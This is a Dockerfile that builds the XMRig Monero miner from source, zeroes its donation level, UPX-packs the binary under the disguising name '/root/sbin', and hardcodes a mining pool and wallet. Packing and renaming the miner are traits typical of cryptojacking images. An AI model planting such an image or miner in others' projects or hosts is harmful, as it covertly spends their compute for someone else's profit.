FROM alpine:3.12

LABEL maintainer="ToRxmrig"

WORKDIR /app

RUN apk add --update --no-cache --virtual .build-deps upx git make cmake libstdc++ gcc g++ automake libtool autoconf linux-headers \
    && git clone https://github.com/xmrig/xmrig.git /tmp/xmrig \
    && mkdir /tmp/xmrig/build

RUN sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/' /tmp/xmrig/src/donate.h
RUN sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/' /tmp/xmrig/src/donate.h

RUN cd /tmp/xmrig/scripts && ./build_deps.sh
RUN cmake -S /tmp/xmrig -B /tmp/xmrig/build -DXMRIG_DEPS=/tmp/xmrig/scripts/deps -DBUILD_STATIC=ON
RUN make -j$(nproc) -C /tmp/xmrig/build
RUN upx -9 -o sbin xmrig
RUN cp ./sbin /root/sbin
RUN chmod +x /root/sbin
RUN apk del .build-deps 
RUN rm -rf /tmp/*
ENV CPU_LIMIT_PERCENT="50" 
ENV ALGO="rx/0"
ENV POOL="us-east01.miningrigrentals.com:3333"
ENV WALLET="webdevthree.329556"
ENV WORKER="docker"
ENV DIFFICULTY="50000"
ENV DONATE="1"

COPY root /

RUN chmod +x /app/entrypoint.sh

ENTRYPOINT [ "/app/entrypoint.sh" ]
